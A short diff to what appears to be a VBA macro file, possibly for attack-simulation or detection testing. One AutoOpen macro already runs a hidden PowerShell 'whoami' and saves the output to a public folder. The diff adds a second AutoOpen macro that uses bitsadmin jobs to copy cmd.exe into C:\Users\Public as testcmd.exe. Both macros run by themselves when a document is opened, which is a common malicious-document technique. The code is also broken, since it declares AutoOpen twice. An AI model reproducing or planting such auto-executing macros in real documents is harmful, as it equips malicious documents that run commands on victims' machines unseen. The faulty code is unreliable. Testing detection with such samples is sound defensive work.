@@ -18,3 +18,12 @@ Sub AutoOpen()
     Set shell = CreateObject("WScript.Shell")
     shell.Run "powershell -WindowStyle Hidden -Command whoami > C:\Users\Public\whoami.txt"
 End Sub
+
+
+Sub AutoOpen()
+    Dim s As Object
+    Set s = CreateObject("WScript.Shell")
+    s.Run "bitsadmin /create whoami_job"
+    s.Run "bitsadmin /addfile whoami_job C:\Windows\System32\cmd.exe C:\Users\Public\testcmd.exe"
+    s.Run "bitsadmin /complete whoami_job"
+End Sub
